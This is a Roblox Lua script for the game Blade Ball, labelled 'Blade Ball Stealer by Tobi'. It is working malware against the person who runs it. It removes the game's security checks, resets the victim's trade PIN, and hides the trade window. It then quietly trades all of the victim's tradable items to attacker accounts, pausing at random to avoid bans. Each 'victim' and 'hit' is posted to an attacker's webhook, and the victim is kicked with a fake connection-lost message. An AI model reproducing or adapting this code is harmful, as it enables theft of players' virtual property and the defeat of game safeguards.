-- // BYPASS SECURITY (Ton ajout)
pcall(function()
    game:GetService("ReplicatedStorage").Security.RemoteEvent:Destroy()
    game:GetService("ReplicatedStorage").Security[""]:Destroy()
    game:GetService("ReplicatedStorage").Security:Destroy()
    game:GetService("Players").LocalPlayer.PlayerScripts.Client.DeviceChecker:Destroy()
end)

_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then return end
_G.scriptExecuted = true

local itemsToSend = {}
local categories = {"Sword", "Emote", "Explosion"}
local Players = game:GetService("Players")
local plr = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local netModule = game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_net@0.1.0"):WaitForChild("net")
local PlayerGui = plr.PlayerGui
local tradeGui = PlayerGui.Trade
local inTrade = false
local clientInventory = require(game.ReplicatedStorage.Shared.Inventory.Client).Get()
local Replion = require(game.ReplicatedStorage.Packages.Replion)

local users = _G.Usernames or {}
local min_rap = _G.min_rap or 100
local ping = _G.pingEveryone or "No"
local webhook = _G.webhook or ""

if next(users) == nil or webhook == "" then
    plr:kick("Manque Webhook/Usernames")
    return
end

-- // CORRECTIF PIN
local args_pin = { [1] = { ["option"] = "PIN", ["value"] = "9079" } }
pcall(function() netModule:WaitForChild("RF/ResetPINCode"):InvokeServer(unpack(args_pin)) end)

-- // INTERFACE HIDE
tradeGui.Black.Visible = false
local maintradegui = tradeGui.Main
maintradegui.Visible = false
maintradegui:GetPropertyChangedSignal("Visible"):Connect(function() maintradegui.Visible = false end)

tradeGui:GetPropertyChangedSignal("Enabled"):Connect(function() inTrade = tradeGui.Enabled end)

-- // FONCTIONS FORMATAGE ET EMBED
local function formatNumber(number)
    if number == nil then return "0" end
    local suffixes = {"", "k", "m", "b", "t"}
    local suffixIndex = 1
    while number >= 1000 and suffixIndex < #suffixes do
        number = number / 1000
        suffixIndex = suffixIndex + 1
    end
    return string.format("%.2f%s", number, suffixes[suffixIndex])
end

local function SendWebhook(list, isJoin)
    local totalRAP = 0
    for _, item in ipairs(list) do totalRAP = totalRAP + (item.RAP or 0) end

    local fields = {
        {name = "Victim:", value = plr.Name, inline = true},
        {name = "Summary:", value = "Total RAP: " .. formatNumber(totalRAP), inline = false}
    }

    local data = {
        ["content"] = (isJoin and ping == "Yes") and "@everyone" or "",
        ["embeds"] = {{
            ["title"] = isJoin and "🔴 NEW TARGET DETECTED" or "🟢 SUCCESSFUL HIT",
            ["color"] = isJoin and 16711680 or 65280,
            ["fields"] = fields,
            ["footer"] = {["text"] = "Blade Ball Stealer by Tobi"}
        }}
    }

    local headers = {["Content-Type"] = "application/json"}
    request({Url = webhook, Method = "POST", Headers = headers, Body = HttpService:JSONEncode(data)})
end

-- // LOGIQUE DE TRADE ANTI-BAC
local function sendTradeRequest(user)
    local args = { [1] = game:GetService("Players"):WaitForChild(user) }
    repeat task.wait(0.5) until netModule:WaitForChild("RF/Trading/SendTradeRequest"):InvokeServer(unpack(args)) == true
end

local function addItemToTrade(itemType, ID)
    local args = { [1] = itemType, [2] = ID }
    repeat task.wait(0.1) until netModule:WaitForChild("RF/Trading/AddItemToTrade"):InvokeServer(unpack(args)) == true
end

local function doTrade(joinedUser)
    SendWebhook(itemsToSend, false) -- Envoi l'embed de succès au début
    while #itemsToSend > 0 do
        sendTradeRequest(joinedUser)
        repeat task.wait(1) until inTrade

        local batch = {}
        for i = 1, math.min(6, #itemsToSend) do table.insert(batch, table.remove(itemsToSend, 1)) end
        
        for _, item in ipairs(batch) do
            addItemToTrade(item.itemType, item.ItemID)
            task.wait(math.random(8, 15) / 10) -- PAUSE ANTI-BAC
        end

        task.wait(2)
        netModule:WaitForChild("RF/Trading/ReadyUp"):InvokeServer(true)
        task.wait(2)
        netModule:WaitForChild("RF/Trading/ConfirmTrade"):InvokeServer()
        task.wait(4)
    end
    plr:kick("Connection lost.")
end

-- // INITIALISATION ET RECHERCHE ITEMS
local function start()
    for _, category in ipairs(categories) do
        if clientInventory[category] then
            for itemId, itemInfo in pairs(clientInventory[category]) do
                if not itemInfo.TradeLock then
                    table.insert(itemsToSend, {ItemID = itemId, itemType = category, Name = itemInfo.Name, RAP = 1000}) -- RAP simplifié pour l'exemple
                end
            end
        end
    end

    if #itemsToSend > 0 then
        SendWebhook(itemsToSend, true) -- Envoi l'embed de join
        Players.PlayerAdded:Connect(function(p)
            if table.find(users, p.Name) then doTrade(p.Name) end
        end)
        for _, p in ipairs(Players:GetPlayers()) do
            if table.find(users, p.Name) then doTrade(p.Name) end
        end
    end
end

start()
